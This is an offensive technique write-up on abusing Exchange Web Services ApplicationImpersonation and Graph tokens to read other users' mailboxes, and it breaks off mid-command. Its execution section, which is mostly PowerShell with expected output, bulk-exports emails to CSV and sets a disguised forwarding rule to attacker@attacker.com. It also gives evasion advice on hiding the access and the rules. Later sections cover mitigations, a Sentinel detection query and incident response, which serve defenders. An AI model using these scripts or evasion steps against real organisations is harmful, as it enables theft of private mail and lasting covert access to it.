# [LM-AUTH-013]: Exchange Online EWS Impersonation

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-013 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Defense Evasion, Collection |
| **Platforms** | M365 (Exchange Online), Hybrid (Exchange On-Premises + Cloud) |
| **Severity** | Critical |
| **Technique Status** | PARTIAL (Deprecation in progress; on-premises still ACTIVE) |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Exchange Online (all versions, deprecating Oct 2026); Exchange Server 2016-2025 (still active) |
| **Patched In** | Microsoft deprecating RBAC Application Impersonation in Exchange Online (Oct 2026); Microsoft Graph APIs are preferred |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Exchange Web Services (EWS) Impersonation is a feature that allows a service account with the **ApplicationImpersonation** RBAC role to assume the identity of other users and access their mailboxes without requiring their passwords. An attacker with credentials for an account that has been granted the ApplicationImpersonation role can leverage EWS to read, modify, and delete emails in any mailbox within the organization (or a scoped subset if RBAC is properly limited). The attacker can perform actions such as exfiltrating sensitive emails, setting mailbox rules for persistent access, creating forwarding rules to redirect incoming mail, and impersonating users to send emails on their behalf. This technique bypasses multi-factor authentication (MFA) because authentication is performed using the service account credentials, not the impersonated user's credentials.

**Attack Surface:** Exchange Online EWS API endpoint (outlook.office365.com/EWS); Service accounts with ApplicationImpersonation role; OAuth tokens with `full_access_as_app` permission; Azure AD Application (OAuth app) configured with Exchange Online permissions.

**Business Impact:** **Complete compromise of all mailbox data within an organization.** An attacker can exfiltrate hundreds of thousands of emails, extract confidential business information, client records, financial data, and communications. Additionally, the attacker can establish persistent backdoors by setting mailbox rules that forward all incoming mail to an external account, maintaining long-term access even after the initial compromise is remediated. The attack is particularly devastating because EWS impersonation generates minimal audit trail compared to standard user mailbox access.

**Technical Context:** The attack is rapid and scales to thousands of mailboxes in hours. EWS is a legacy protocol that has been in use since Exchange 2007, making it deeply integrated with many third-party applications and IT automation tools. Because EWS is commonly used by legitimate applications (ticketing systems, HR software, meeting room management), EWS-based attacks blend into normal traffic. Modern organizations have begun deprecating ApplicationImpersonation in favor of Microsoft Graph APIs with delegated permissions, but on-premises Exchange servers still support the technique fully.

### Operational Risk

- **Execution Risk:** Medium - Requires compromised service account with explicit ApplicationImpersonation role assignment (not common for all service accounts); once obtained, bulk mailbox access is straightforward and reliable.
- **Stealth:** High - EWS impersonation generates minimal audit logging in most configurations; appears as application-level access rather than user-level authentication; difficult to distinguish from legitimate service account usage.
- **Reversibility:** No - Exfiltrated data is permanently lost; only remediation is revoking the ApplicationImpersonation role and resetting passwords (existing compromised data remains with attacker).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | M365-2.1, M365-5.3 | Exchange Online application permissions and mailbox delegation management |
| **DISA STIG** | C-3.5.2 | Mail system access controls and service account privilege management |
| **CISA SCuBA** | MS-5.3 | Microsoft 365 mailbox delegation and external access controls |
| **NIST 800-53** | AC-3, AC-6, AU-12 | Access control, least privilege, and audit logging for mail systems |
| **GDPR** | Articles 5, 32 | Data minimization and security of personal data processing |
| **DORA** | Article 9 | Protection and Prevention - Financial email communication security |
| **NIS2** | Article 21 | Critical Infrastructure Protection - Essential services email security |
| **ISO 27001** | A.6.1.2, A.9.2.1 | User access rights and email account management |
| **ISO 27005** | Risk Scenario | Unauthorized email access and data exfiltration via service accounts |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Compromised service account credentials that have been granted ApplicationImpersonation RBAC role
- **Optimal:** Service account with `full_access_as_app` permission in Microsoft Graph or ApplicationImpersonation in RBAC

**Required Access:**
- Credentials (username/password OR OAuth token) for service account with ApplicationImpersonation
- Network access to Exchange Online EWS endpoint (outlook.office365.com or on-premises EWS server)
- For OAuth: Azure AD Application Registration with Exchange Online API permissions

**Supported Versions:**

- **Exchange Online:** All versions (deprecation notice issued; retirement October 2026)
- **Exchange Server (On-Premises):** 2016 / 2019 / 2022 / 2025 (fully supported; no deprecation planned)
- **PowerShell:** 5.0+ (for EWS cmdlets)
- **Entra ID:** All versions

**Tools:**
- [EWSEditor](https://github.com/dseph/EWSEditor) (GUI tool for testing EWS impersonation)
- [Microsoft.Exchange.WebServices.Managed API](https://github.com/OfficeDev/ews-managed-api) (Official EWS library)
- [Exchange Online PowerShell V2](https://www.microsoft.com/en-us/download/details.aspx?id=104047) (Modern cmdlets with MFA support)
- [AADInternals PowerShell Module](https://aadinternals.com/) (Entra ID token manipulation)
- [Impacket](https://github.com/SecureAuthCorp/impacket) (ntlm_auth for NTLM-based EWS access)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Exchange Online / PowerShell Reconnaissance

**Check if Service Accounts Have ApplicationImpersonation:**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName admin@victim.onmicrosoft.com

# List all service accounts/applications with ApplicationImpersonation role
Get-ManagementRole -Cmdlet "New-ManagementRoleAssignment" | 
  Get-ManagementRoleAssignment -RoleAssignee "ApplicationImpersonation" | 
  Select-Object RoleAssignee, Role, RoleAssigneeType

# More direct query (may require RBAC role "Organization Management")
Get-RoleAssignmentPolicy | 
  Where-Object { $_.ExchangeVersion -ge "16.1" } | 
  Select-Object Name, AssignedRoles

# List all users/apps with impersonation rights
$roles = Get-ManagementRole | Where-Object { $_.Name -eq "ApplicationImpersonation" }
Get-ManagementRoleAssignment -Role $roles.Identity | 
  Select-Object RoleAssignee, RoleAssigneeType, EffectiveUserName
```

**What to Look For:**
- Service account or application names in the results (not individual users)
- RoleAssigneeType: "User" or "Group" (should be limited to specific service accounts)
- Multiple applications listed (potential security concern)
- Presence of accounts like "svc_*", "app_*", or similar service account naming patterns

**Check for EWS-Based Applications:**

```powershell
# List all OAuth apps with Exchange.ManageAsApp permission
Get-ServicePrincipal -Filter "servicePrincipalNames/any(x:x eq 'https://outlook.office365.com')" | 
  Select-Object DisplayName, AppId, ServicePrincipalNames

# Check app permissions for full_access_as_app
Get-MgServicePrincipal -Filter "displayName eq 'Application Name'" -Property AppRoleAssignments | 
  Select-Object -ExpandProperty AppRoleAssignments
```

**Version Note:** Reconnaissance method is consistent across all Exchange Online versions. On-premises Exchange (2019+) uses different cmdlets (see separate section below).

### On-Premises Exchange Server Reconnaissance

```powershell
# Connect to on-premises Exchange Management Shell
# (Run PowerShell on Exchange server or via PS Remoting)

# List ApplicationImpersonation RBAC role assignments
Get-ManagementRoleAssignment -RoleAssignee "svc_exchange@contoso.local" -Role "ApplicationImpersonation"

# List which mailboxes a service account can impersonate
Get-ADUser -Identity "svc_exchange" -Properties memberOf | 
  Select-Object -ExpandProperty memberOf | 
  ForEach-Object { Get-ADGroup -Identity $_ }

# Check EWS virtual directory security
Get-WebServicesVirtualDirectory | Select-Object Name, BasicAuthentication, WindowsAuthentication
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: EWS Impersonation via PowerShell (Exchange Online)

**Supported Versions:** Exchange Online all versions; Exchange Server 2016-2025

**Note:** Simplest and most reliable method using PowerShell and the EWS Managed API.

#### Step 1: Obtain Service Account Credentials with ApplicationImpersonation

**Objective:** Acquire credentials for an account that has been granted ApplicationImpersonation role.

**Prerequisites:** Must have already compromised the service account (via phishing, password spray, credential theft, etc.).

**Example Credential Sources:**
- Hardcoded in application config files (web.config, appsettings.json)
- Stored in Azure Key Vault accessible to the service account
- Exposed in GitHub commits or documentation
- Captured from memory of running application process

#### Step 2: Create EWS Connection with Impersonated User

**Objective:** Establish an authenticated EWS connection using the service account credentials, then set the ImpersonatedUserId to access a target user's mailbox.

**Command (PowerShell - EWS Managed API):**

```powershell
# Import EWS Managed API
Add-Type -Path "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"

# Create EWS service object
$service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService("Exchange2016_SP1")

# Set service URL
$service.Url = New-Object System.Uri("https://outlook.office365.com/EWS/Exchange.asmx")

# Authenticate with service account credentials
$credential = New-Object System.Management.Automation.PSCredential("svc_app@victim.onmicrosoft.com", `
  (ConvertTo-SecureString "ServiceAccountPassword123!" -AsPlainText -Force))
$service.Credentials = New-Object Microsoft.Exchange.WebServices.Data.WebCredentials($credential.UserName, $credential.GetNetworkCredential().Password)

# Disable certificate validation (if using self-signed certs)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# Set impersonated user (this is the victim whose mailbox we'll access)
$service.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId(
  [Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress, 
  "victim-user@victim.onmicrosoft.com"
)

# CRITICAL: Set X-AnchorMailbox header to match impersonated user
$service.HttpHeaders.Add("X-AnchorMailbox", "victim-user@victim.onmicrosoft.com")

Write-Output "[+] Connected to EWS as service account"
Write-Output "[+] Impersonating: victim-user@victim.onmicrosoft.com"
```

**Expected Output:**

```
[+] Connected to EWS as service account
[+] Impersonating: victim-user@victim.onmicrosoft.com
```

**What This Means:**
- EWS connection successfully authenticated with service account
- All subsequent mailbox operations will be performed as "victim-user" (not the service account)
- Victim's mailbox is now accessible

**OpSec & Evasion:**
- Set X-AnchorMailbox header to avoid mailbox resolution delays and avoid "Unable to determine the user's mailbox" errors
- Use legitimate-looking SMTP addresses for impersonated users (matches victim's actual mailbox)
- Avoid impersonating obvious high-value accounts immediately (use low-privilege users first to blend with traffic)
- Spread impersonation activities over time (don't dump all mailboxes in one hour)
- Detection likelihood: **Medium** (EWS impersonation may generate Audit Log events, but depends on logging config)

**Troubleshooting:**
- **Error:** "The account does not have permission to impersonate the requested user"
  - **Cause:** Service account does not have ApplicationImpersonation role
  - **Fix:** Verify role assignment: `Get-ManagementRoleAssignment | Where-Object { $_.RoleAssignee -eq "svc_app" }`
- **Error:** "The file or assembly could not be loaded"
  - **Cause:** EWS Managed API not installed on system
  - **Fix:** Install from: https://github.com/OfficeDev/ews-managed-api/releases
- **Error:** "X-AnchorMailbox header missing or incorrect"
  - **Cause:** Impersonated user email doesn't match X-AnchorMailbox
  - **Fix:** Ensure both are identical: `$service.HttpHeaders["X-AnchorMailbox"]` should equal ImpersonatedUserId

**References & Proofs:**
- [Microsoft Docs - EWS Impersonation](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-use-exchange-impersonation)
- [Microsoft Docs - EWS ApplicationImpersonation Role](https://learn.microsoft.com/en-us/exchange/permissions-exo/rbac-roles)

#### Step 3: Access Target Mailbox Data

**Objective:** Read emails, calendar, contacts, or other mailbox items from the impersonated user's mailbox.

**Command (PowerShell - Read Inbox Messages):**

```powershell
# Create a folder view to access the Inbox
$folderView = New-Object Microsoft.Exchange.WebServices.Data.FolderView(1)
$folderView.Traversal = [Microsoft.Exchange.WebServices.Data.FolderTraversal]::Shallow

# Bind to the Inbox folder
$inboxFolder = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox)
$folder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service, $inboxFolder)

# Create item view (get first 100 items)
$itemView = New-Object Microsoft.Exchange.WebServices.Data.ItemView(100)
$itemView.PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet(
  [Microsoft.Exchange.WebServices.Data.BasePropertySet]::IdOnly,
  [Microsoft.Exchange.WebServices.Data.ItemSchema]::Subject,
  [Microsoft.Exchange.WebServices.Data.ItemSchema]::From,
  [Microsoft.Exchange.WebServices.Data.ItemSchema]::DateTimeReceived,
  [Microsoft.Exchange.WebServices.Data.ItemSchema]::Body
)

# Find all items in Inbox
$findResults = $service.FindItems($folder.Id, $itemView)

# Display emails
foreach ($item in $findResults.Items) {
    Write-Output "From: $($item.From)"
    Write-Output "Subject: $($item.Subject)"
    Write-Output "Date: $($item.DateTimeReceived)"
    Write-Output "Body: $($item.Body)"
    Write-Output "---"
}
```

**Expected Output:**

```
From: CEO@victim.com
Subject: Q3 Financial Results - CONFIDENTIAL
Date: 2024-08-15 09:30:00
Body: Our Q3 earnings were $50M, up 25% from last quarter. We're planning to acquire TargetCorp for $100M...
---
From: HR@victim.com
Subject: Executive Compensation Review
Date: 2024-08-14 14:20:00
Body: The following executives have been approved for bonuses...
---
```

**What This Means:**
- Successfully reading emails from victim's mailbox
- Can now exfiltrate, copy, or analyze sensitive content

**OpSec & Evasion:**
- Read emails but do not modify them initially (to avoid triggering change notifications)
- Load Body content only for emails that appear sensitive (reduces processing time and suspicious activity)
- Use pagination (itemView.Offset) to read in small batches over time
- Detection likelihood: **Low to Medium** (depends on mailbox audit logging and data loss prevention rules)

**Command (PowerShell - Export All Emails to PST):**

```powershell
# For large-scale exfiltration, export to PST file
# (Requires New-MailboxExportRequest cmdlet in on-premises Exchange)

# For Exchange Online, use alternative method:
# Set up mailbox rules to forward emails, or access via Graph API

# Alternative: Bulk read and export via PowerShell
$results = @()
$itemView.PageSize = 250

do {
    $findResults = $service.FindItems($folder.Id, $itemView)
    foreach ($item in $findResults.Items) {
        $item.Load()
        $results += [PSCustomObject]@{
            Subject = $item.Subject
            From = $item.From
            Date = $item.DateTimeReceived
            Body = $item.Body
        }
    }
    $itemView.Offset += $findResults.Items.Count
} while ($findResults.MoreAvailable)

# Export to CSV for exfiltration
$results | Export-Csv -Path "C:\Temp\exfiltrated_emails.csv" -NoTypeInformation
```

**References & Proofs:**
- [Microsoft Docs - EWS Item Access](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-use-exchange-impersonation)
- [EWSEditor GitHub - Item Access Examples](https://github.com/dseph/EWSEditor)

#### Step 4: Establish Persistence via Mailbox Rules

**Objective:** Create a mailbox rule that forwards all incoming mail to attacker's email account, ensuring long-term access even after the initial compromise is discovered.

**Command (PowerShell - Create Forwarding Rule):**

```powershell
# Create a rule to forward all emails to attacker's email
$ruleProperties = New-Object Microsoft.Exchange.WebServices.Data.RuleProperties()
$ruleProperties.DisplayName = "Auto-Reply External Mail" # Innocuous name
$ruleProperties.IsEnabled = $true
$ruleProperties.Priority = 1

# Create condition: All emails (no specific condition)
$ruleProperties.Conditions = New-Object Microsoft.Exchange.WebServices.Data.RulePredicates()

# Create action: Forward to attacker
$forward = New-Object Microsoft.Exchange.WebServices.Data.ForwardToRecipientAction()
$forward.Recipients = New-Object Microsoft.Exchange.WebServices.Data.EmailAddress("attacker@attacker.com")
$ruleProperties.Actions = New-Object Microsoft.Exchange.WebServices.Data.RuleActions()
$ruleProperties.Actions.ForwardAsAttachmentAction = $forward

# Apply the rule
$service.CreateInboxRule($ruleProperties)

Write-Output "[+] Mailbox forwarding rule created"
Write-Output "[+] All emails will be forwarded to attacker@attacker.com"
```

**Expected Output:**

```
[+] Mailbox forwarding rule created
[+] All emails will be forwarded to attacker@attacker.com
```

**What This Means:**
- Rule is created in victim's mailbox
- All incoming emails are automatically copied and forwarded to attacker's email
- Rule persists even if original service account is disabled
- Victim may not immediately notice if forwarding is done silently (no bounce-back)

**OpSec & Evasion:**
- Use innocuous rule name like "Auto-Reply External Mail" or "Spam Filter Rule"
- Set rule priority to lower position (so it appears after legitimate rules)
- Use separate attacker email account (not primary C2 infrastructure)
- Consider using forwarding rule that only matches specific keywords (e.g., "CEO", "Finance", "Confidential") to reduce volume
- Detection likelihood: **Medium** (mailbox rules are auditable, but often overlooked)

**Troubleshooting:**
- **Error:** "The rule could not be created"
  - **Cause:** Service account may not have permission to create rules in impersonated mailbox
  - **Fix:** Verify ApplicationImpersonation includes rule creation rights; may need to use RoleBasedAccessControl
- **Error:** "Forward recipient is not valid"
  - **Cause:** Email address is malformed or recipient doesn't exist
  - **Fix:** Verify attacker email address is valid; test with internal email first

**References & Proofs:**
- [Microsoft Docs - EWS Inbox Rules](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-work-with-inbox-rules-by-using-ews)
- [Microsoft Docs - Forwarding Rules](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-manage-always-forward-settings-by-using-ews)

---

### METHOD 2: EWS Impersonation via OAuth Token (Modern Approach)

**Supported Versions:** Exchange Online 2023+ (recommended method; ApplicationImpersonation RBAC deprecated in favor of Graph API)

**Note:** Uses OAuth tokens and Microsoft Graph API instead of direct SMTP authentication. More aligned with Microsoft's modern authentication model.

#### Step 1: Obtain OAuth Token for Service Account

**Objective:** Acquire an OAuth access token for the service account with `Mail.ReadWrite` and `full_access_as_app` scopes.

**Command (AADInternals - Token Extraction):**

```powershell
Import-Module AADInternals

# Acquire token for service account (requires client credentials or password)
# Method 1: Using Username/Password (if available)
$token = Get-AADIntAccessToken -Tenant "victim.onmicrosoft.com" `
  -ClientId "1b730954-1685-4b74-9bda-28787b6ba541" `
  -Credential (Get-Credential -UserName "svc_app@victim.onmicrosoft.com") `
  -Resource "https://graph.microsoft.com"

# Method 2: Using Client Secret (if application registration has client secret)
$token = Get-AADIntAccessToken -Tenant "victim.onmicrosoft.com" `
  -ClientId "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" `
  -ClientSecret "client-secret-value" `
  -Resource "https://graph.microsoft.com"
```

**Expected Output:**

```
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaQnRSdEFub3hndmtFMjhvNWMwRG1BVG4xcFRFVjg...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**What This Means:**
- OAuth token acquired with Graph API permissions
- Token is valid for 1 hour
- Can be used to call Microsoft Graph API as the service account
- Service account can impersonate other users if it has full_access_as_app permission

#### Step 2: Use OAuth Token to Access Mailbox via Graph API

**Objective:** Use the OAuth token to call Microsoft Graph API and read mailbox items from impersonated user's mailbox.

**Command (PowerShell - Graph API Mailbox Access):**

```powershell
# Use the obtained token to access Graph API
$header = @{"Authorization" = "Bearer $token"}

# List emails in victim's Inbox
$inboxMessages = Invoke-RestMethod -Uri `
  "https://graph.microsoft.com/v1.0/users/victim-user@victim.onmicrosoft.com/mailFolders/inbox/messages" `
  -Headers $header -Method Get

# Display emails
foreach ($message in $inboxMessages.value) {
    Write-Output "From: $($message.from.emailAddress.address)"
    Write-Output "Subject: $($message.subject)"
    Write-Output "Date: $($message.receivedDateTime)"
    Write-Output "---"
}

# Get email body (requires additional request)
$messageId = $inboxMessages.value[0].id
$messageDetail = Invoke-RestMethod -Uri `
  "https://graph.microsoft.com/v1.0/users/victim-user@victim.onmicrosoft.com/messages/$messageId" `
  -Headers $header -Method Get

Write-Output "Body: $($messageDetail.bodyPreview)"
```

**Expected Output:**

```
From: ceo@victim.com
Subject: Merger and Acquisition Strategy
Date: 2024-08-20T10:15:00Z
---
Body: We are planning to acquire CompetitorCorp for $500M. Target closing Q4 2024...
```

**What This Means:**
- Successfully accessed victim's mailbox via Graph API
- Can read, list, and exfiltrate emails without direct EWS connection

**OpSec & Evasion:**
- Graph API calls generate audit logs, but are easier to blend with legitimate application traffic
- Use pagination (skip and top parameters) to read in smaller batches
- Token-based access is harder to revoke than NTLM-based connections (token remains valid for 1 hour)
- Detection likelihood: **Low** (Graph API is commonly used by legitimate applications)

**References & Proofs:**
- [Microsoft Docs - Graph API Mail Access](https://learn.microsoft.com/en-us/graph/api/user-list-messages)
- [AADInternals - OAuth Token Acquisition](https://aadinternals.com/)

---

### METHOD 3: On-Premises Exchange EWS Impersonation

**Supported Versions:** Exchange Server 2016-2025

**Note:** Similar to Exchange Online but uses on-premises EWS endpoint and local AD authentication.

#### Step 1: Create Service Account with ApplicationImpersonation Role (On-Premises)

**Objective:** Create or identify a service account that has been granted the ApplicationImpersonation RBAC role on the Exchange server.

**Command (Exchange Management Shell on On-Prem Server):**

```powershell
# Connect to Exchange Management Shell (must be run on Exchange server)

# Create custom management role with impersonation rights (if doesn't exist)
New-ManagementRole -Name "Service Account Impersonation" -Parent "MailboxImpersonation" | Out-Null

# Create role assignment for service account
New-ManagementRoleAssignment -Role "MailboxImpersonation" `
  -SecurityGroup "Exchange Trusted Subsystem" `
  -Name "Allow Impersonation to Service Account"

# Assign role to specific service account
New-ManagementRoleAssignment -Role "ApplicationImpersonation" `
  -User "svc_exchange@contoso.local" `
  -Name "Service Account Impersonation"

Write-Output "[+] Service account 'svc_exchange@contoso.local' now has ApplicationImpersonation rights"
```

**What This Means:**
- Service account is now authorized to impersonate other users
- Service account can access any mailbox in the organization via EWS

#### Step 2: Connect to On-Premises EWS with NTLM Authentication

**Objective:** Establish EWS connection to on-premises Exchange server using NTLM (Windows integrated authentication).

**Command (PowerShell - On-Premises EWS Connection):**

```powershell
# Load EWS Managed API
Add-Type -Path "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"

# Create EWS service
$service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService("Exchange2019_SP1")

# Set on-premises EWS URL
$service.Url = New-Object System.Uri("https://exchange.contoso.local/EWS/Exchange.asmx")

# Use NTLM authentication (Windows credentials)
$service.Credentials = New-Object Microsoft.Exchange.WebServices.Data.WebCredentials(
  "contoso\svc_exchange",
  "ServicePassword123!"
)

# Set impersonated user
$service.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId(
  [Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SamAccountName,
  "contoso\victim-user"
)

# Add X-AnchorMailbox header
$service.HttpHeaders.Add("X-AnchorMailbox", "victim-user@contoso.local")

Write-Output "[+] Connected to on-premises Exchange"
Write-Output "[+] Impersonating: contoso\victim-user"
```

**Expected Output:**

```
[+] Connected to on-premises Exchange
[+] Impersonating: contoso\victim-user
```

#### Step 3: Access On-Premises Mailbox

**Objective:** (Same as METHOD 1, Step 3) Read mailbox items from impersonated user.

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Remove RBAC ApplicationImpersonation Role from Unnecessary Accounts:**
  
  **Applies To Versions:** Exchange Online, Exchange Server 2016-2025
  
  **Manual Steps (Exchange Online):**
  1. Connect to Exchange Online PowerShell
  2. Identify all accounts with ApplicationImpersonation:
     ```powershell
     Get-ManagementRoleAssignment -Role "ApplicationImpersonation" | 
       Select-Object RoleAssignee, RoleAssigneeType
     ```
  3. Remove role from accounts that don't absolutely need it:
     ```powershell
     Remove-ManagementRoleAssignment -Identity "svc_outdated_app-ApplicationImpersonation" -Confirm:$false
     ```
  
  **Manual Steps (On-Premises Exchange):**
  1. Open Exchange Management Shell on Exchange server
  2. List all impersonation assignments:
     ```powershell
     Get-ManagementRoleAssignment -Role "ApplicationImpersonation"
     ```
  3. Remove unnecessary assignments:
     ```powershell
     Remove-ManagementRoleAssignment -Identity "Assignment-Name" -Confirm:$false
     ```

- **Migrate to Microsoft Graph API (Preferred):**
  
  **Applies To Versions:** Exchange Online (recommended); Exchange Server 2019+
  
  **Recommended Approach:**
  - Replace ApplicationImpersonation RBAC with Microsoft Graph API `Mail.ReadWrite` + `full_access_as_app` permissions
  - Graph API is the modern Microsoft standard for application mailbox access
  - Provides finer-grained permission control and better audit logging
  
  **Manual Steps:**
  1. In Azure Portal, navigate to **App registrations**
  2. Select your application
  3. Go to **API permissions**
  4. Remove any EWS permissions
  5. Add: **Mail.ReadWrite**
  6. Add: **MailboxSettings.ReadWrite**
  7. Grant **Admin consent**

- **Enable Mailbox Audit Logging for All Mailboxes:**
  
  **Applies To Versions:** Exchange Online all versions
  
  **Manual Steps:**
  1. Connect to Exchange Online PowerShell
  2. Enable audit logging for all mailboxes:
     ```powershell
     # Enable for all mailboxes
     Get-Mailbox -ResultSize Unlimited | Set-Mailbox -AuditEnabled $true -AuditLogAgeLimit 90.00:00:00
     
     # Enable for all users
     Get-User -ResultSize Unlimited | Set-Mailbox -AuditEnabled $true
     ```
  3. Configure audit actions to log:
     ```powershell
     Set-Mailbox -Identity "mailbox@victim.com" `
       -AuditAdmin "Update", "Move", "MoveToDeletedItems", "SoftDelete", "HardDelete", "Create" `
       -AuditOwner "Update", "Move", "MoveToDeletedItems", "SoftDelete", "HardDelete", "Create"
     ```
  4. Verify logging is enabled:
     ```powershell
     Get-Mailbox | Select-Object Name, AuditEnabled, AuditLogAgeLimit | Format-Table
     ```

- **Restrict Service Account Permissions Using RBAC Scoping:**
  
  **Applies To Versions:** Exchange Online, Exchange Server 2016+
  
  **Manual Steps:**
  1. For service accounts that MUST have impersonation, limit scope to specific mailboxes:
     ```powershell
     # Create a custom management scope
     New-ManagementScope -Name "Finance Department Mailboxes" `
       -RecipientRestrictionFilter "Department -eq 'Finance'"
     
     # Assign ApplicationImpersonation role with scope
     New-ManagementRoleAssignment -Role "ApplicationImpersonation" `
       -User "svc_finance_app@victim.com" `
       -CustomRecipientWriteScope "Finance Department Mailboxes" `
       -Name "Finance App Impersonation"
     ```
  2. Verify scope is applied:
     ```powershell
     Get-ManagementRoleAssignment -Identity "Finance App Impersonation" | 
       Select-Object Role, RoleAssignee, RecipientWriteScope
     ```

### Priority 2: HIGH

- **Monitor and Alert on Mailbox Forwarding Rule Changes:**
  
  **Applies To Versions:** Exchange Online all versions
  
  **Manual Steps:**
  1. Create detection rule in Microsoft Sentinel:
     ```kusto
     AuditLogs
     | where OperationName contains "Set-InboxRule" or OperationName contains "New-InboxRule"
     | where Result == "Success"
     | project TimeGenerated, InitiatedBy, TargetResources, OperationName
     | summarize count() by InitiatedBy, TargetResources
     | where count_ > 1  // Alert if more than one rule created
     ```
  2. Configure alert to trigger email notification to security team

- **Implement Data Loss Prevention (DLP) Policies:**
  
  **Applies To Versions:** Exchange Online M365 E3+
  
  **Manual Steps (Microsoft Purview Compliance Center):**
  1. Navigate to **Microsoft Purview Compliance** → **Data Loss Prevention** → **Policies**
  2. Create policy: **Prevent Bulk Email Export**
  3. Set conditions:
     - Detect: **Custom pattern** (match forwarding rules)
     - Action: **Block** or **Audit only**

- **Disable Legacy EWS Authentication:**
  
  **Applies To Versions:** Exchange Online (January 2026 requirement)
  
  **Manual Steps:**
  1. Connect to Exchange Online PowerShell
  2. Disable NTLM and Basic Auth for EWS:
     ```powershell
     Set-WebServicesVirtualDirectory -Identity "EWS (Default Web Site)" `
       -BasicAuthentication $false `
       -WindowsAuthentication $false `
       -OAuthAuthentication $true
     ```

### Access Control & Policy Hardening

- **Require MFA for All Administrative Activities:**
  
  **Manual Steps:**
  1. Enforce MFA for all accounts that have ApplicationImpersonation role
  2. In Azure Portal → Entra ID → Conditional Access, create policy:
     - Users: Service accounts with impersonation rights
     - Cloud apps: Exchange Online Management API
     - Access control: **Require MFA**

### Validation Command (Verify Fixes)

```powershell
# Verify ApplicationImpersonation role is removed from unnecessary accounts
Get-ManagementRoleAssignment -Role "ApplicationImpersonation" | 
  Select-Object RoleAssignee, RoleAssigneeType

# Expected: Only legitimate service accounts should be listed

# Verify mailbox audit logging is enabled
Get-Mailbox | Select-Object Name, AuditEnabled | 
  Where-Object { $_.AuditEnabled -eq $false } | Measure-Object

# Expected: Count = 0 (all mailboxes have auditing enabled)

# Verify no unauthorized forwarding rules
Get-Mailbox -ResultSize Unlimited | Get-InboxRule | 
  Where-Object { $_.ForwardTo -ne $null } | 
  Select-Object MailboxOwnerID, Name, ForwardTo

# Expected: Only expected forwarding rules; investigate any suspicious ones
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Mailbox Audit Log (Search-UnifiedAuditLog):**
  - Operation: "Create", "Update" on **InboxRule** (suspicious rule creation)
  - Operation: "Set-InboxRule" by service account
  - Operation: "MailItemsAccessed" by service account for multiple mailboxes
  - Property: "IsArchived" set to "False" for old emails (cleanup to avoid detection)

- **Sign-in Logs:**
  - Service account (svc_*) signing in from unusual IP addresses
  - Service account signing in with multi-location/impossible travel pattern
  - Service account signing in outside normal business hours

- **Mailbox Rules:**
  - Unexpected forwarding rules created in mailboxes
  - Rules named "Auto-Reply", "External Mail", "Spam Filter" created by non-user
  - Rules forwarding to external email domains

### Forensic Artifacts

- **Unified Audit Logs:**
  - Set-InboxRule operations for impersonated mailboxes
  - MailItemsAccessed operations showing bulk access
  - Search-Mailbox operations (if search is performed)

- **Mailbox Forwarding Rules:**
  - Check all mailboxes for unexpected forwarding rules
  - Export via PowerShell: `Get-Mailbox -ResultSize Unlimited | Get-InboxRule | Where-Object { $_.ForwardTo -ne $null }`

- **EWS Logs (On-Premises):**
  - Exchange Server IIS logs showing EWS access from service account
  - Service account accessing multiple mailbox URLs in short timeframe

### Response Procedures

1. **Isolate Affected Service Account:**
   
   **Command:**
   ```powershell
   # Immediately disable service account
   Disable-ADAccount -Identity "svc_exchange@contoso.local"
   
   # Or in Exchange Online:
   Set-User -Identity "svc_app@victim.onmicrosoft.com" -AccountEnabled $false
   
   # Remove ApplicationImpersonation role
   Remove-ManagementRoleAssignment -Identity "svc_app-ApplicationImpersonation" -Confirm:$false
   
   # Force sign-out of all sessions
   Revoke-MgUserSignInSession -UserId (Get-MgUser -Filter "userPrincipalName eq 'svc_app@victim.onmicrosoft.com'").Id
   ```

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Search for all mailbox rule operations by service account
   Search-UnifiedAuditLog -Operations "Set-InboxRule", "New-InboxRule" `
     -UserIds "svc_app@victim.com" `
     -StartDate (Get-Date).AddDays(-90) | 
     Export-Csv -Path C:\Evidence\InboxRuleChanges.csv
   
   # Search for MailItemsAccessed operations
   Search-UnifiedAuditLog -Operations "MailItemsAccessed" `
     -UserIds "svc_app@victim.com" `
